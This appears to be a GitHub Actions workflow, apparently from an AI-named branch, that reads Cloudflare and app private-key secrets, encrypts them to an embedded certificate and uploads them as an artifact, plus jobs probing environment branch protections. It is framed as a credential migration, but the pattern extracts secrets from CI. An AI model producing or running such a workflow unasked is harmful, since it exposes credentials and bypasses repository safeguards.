name: One-time encrypted credential migration

on:
  push:
    branches: [codex/migrate-action-secrets-20261019]
    paths: [.github/workflows/credential-migration.yml]

permissions:
  contents: read

jobs:
  seal:
    if: github.repository == 'esaueng/OpenZCAD' && github.repository_id == '1334829303' && github.actor == 'petertoday' && github.actor_id == '171875562' && github.ref == 'refs/heads/codex/migrate-action-secrets-20261019'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # No checkout or third-party executable runs with these credentials.
      - name: Encrypt existing credentials for the local migration operator
        shell: bash
        env:
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          REMUS_UPDATER_APP_PRIVATE_KEY: ${{ secrets.REMUS_UPDATER_APP_PRIVATE_KEY }}
        run: |
          python3 - <<'PY'
          import hashlib, json, os, subprocess
          from pathlib import Path
          names = ('CLOUDFLARE_API_TOKEN', 'CLOUDFLARE_ACCOUNT_ID', 'REMUS_UPDATER_APP_PRIVATE_KEY')
          if any(not os.environ.get(name) for name in names):
              raise SystemExit('A required source credential is missing; nothing exported.')
          payload = json.dumps({
              'schema': 1,
              'nonce': '57a33dfbf5d5a45c004d5842',
              'repository': os.environ['GITHUB_REPOSITORY'],
              'sha': os.environ['GITHUB_SHA'],
              'run_id': os.environ['GITHUB_RUN_ID'],
              'secrets': {name: os.environ[name] for name in names},
          }).encode()
          certificate = b"""-----BEGIN CERTIFICATE-----
          MIIEQTCCAqmgAwIBAgIUDtmOsWRSb96/uP/xQGbGC2O3rOMwDQYJKoZIhvcNAQEL
          BQAwMDEuMCwGA1UEAwwlT3BlblpDQUQgb25lLXRpbWUgY3JlZGVudGlhbCB0cmFu
          c2ZlcjAeFw0yNjEwMTkyMDM0MjBaFw0yNjEwMjAyMDM0MjBaMDAxLjAsBgNVBAMM
          JU9wZW5aQ0FEIG9uZS10aW1lIGNyZWRlbnRpYWwgdHJhbnNmZXIwggGiMA0GCSqG
          SIb3DQEBAQUAA4IBjwAwggGKAoIBgQD9dUKhvfZGaXEk6OJV0hr2iS94FvdxjJD9
          UC5MS/APxYSXQKq//uDjLRdYMMObflKicqgs0U2UPeE/cRwuQ5CWy4zoERJq+AHv
          mt5CIHM8Xh/Hn3yAzXcrFmdVGihd94vXXWRSPLxnsOjdQIHT+igC2rk9Qr1d8vvO
          /BQ/VEmAv8zssPfkdU8R760pK2wbFjXS8tv4Ho0DKXyUKVf6lZQ4jROyUDgctA/l
          Fn+KuYcm+RuzJWGkgEqRnMZ6vMlqOaUvqpij0BQNyBJUmmMh88dX8CW1S+g5CK2U
          AiBf0WwKpWFds9BhljZaIS43YZR8VDXUrVREN2MFO9ca6uO0eolALyGyIfviWmh9
          L8eAuDxeAQnShMeTGQy6dMIEL+sy6mFKulnx7VSKBLcSxE9Tn3rZisKtkciVlAMY
          aT36vjGVQK3sad2lf4e/8g+27LvCD8ha4zvwYmBkm/ie+SZulvq1hsFxOUngLFKv
          cm2rYnMwk5B5QjJPOJcM1ml5FNWK+JsCAwEAAaNTMFEwHQYDVR0OBBYEFGmACt+h
          e0PDbTX//QV0jZo7cGyGMB8GA1UdIwQYMBaAFGmACt+he0PDbTX//QV0jZo7cGyG
          MA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggGBAM82KhjFl02OjAAN
          kztlm32dHx7livnlvHztwLPnzCDfBqq7qhGaY5ri9kjmozHQih/vlk3SmQaZVplv
          Xi3/P9dHd7MRj1qP/urIIzva8BCdJQkgBYJKjyJvT6vegdXLexviHji8sP+l1XIJ
          ZEdLsyMeF0abGs/M8af1scSJv7Z3XWjA2Usmc4ESsXILw+bpUsb/xsEfryavOCgo
          eWJy7b6atydGO7zEpCSHmrdJWZEB/2Cpl5NO4Fz0vzuPgtSbZHLpwgirbVWiIrMG
          LGVB36zQAbwfTsD1976V4MK6OqgDJMIWmvdLnj+CiVT0PHTJhLaWQxprPqaRifyx
          fp0qB4OJFIuZsF26tz59OoBsrDhYt/oDnHgTXM2TLBe2mE9mdW8rLBuHeC+MHPli
          3Cl6dhnXRv0NinkLVFXUP9w2fmT9dFYko8duT38IzxednBu7ey2jwm0ueqrOMAbU
          UHA1G35Xn+NjcDvwGJB6M7VnGXFnSEYTbI2Bv2iYMRc3iIRYdA==
          -----END CERTIFICATE-----
          """
          Path('recipient.pem').write_bytes(certificate)
          result = subprocess.run(
              ['openssl', 'cms', '-encrypt', '-binary', '-aes-256-gcm', '-outform', 'DER', 'recipient.pem'],
              input=payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
          )
          if result.returncode:
              raise SystemExit('Credential encryption failed; nothing exported.')
          Path('credentials.cms').write_bytes(result.stdout)
          print('Encrypted payload SHA256: ' + hashlib.sha256(result.stdout).hexdigest())
          PY
      - name: Retain ciphertext for one day
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: credential-migration-57a33dfbf5d5a45c004d5842
          path: credentials.cms
          if-no-files-found: error
          retention-days: 1
          compression-level: 0

  probe-cloudflare-boundary:
    runs-on: ubuntu-latest
    timeout-minutes: 1
    environment: cloudflare-versions
    steps:
      - name: Fail if a non-main branch passes the environment policy
        run: exit 1

  probe-remus-boundary:
    runs-on: ubuntu-latest
    timeout-minutes: 1
    environment: remus-updater
    steps:
      - name: Fail if a non-main branch passes the environment policy
        run: exit 1
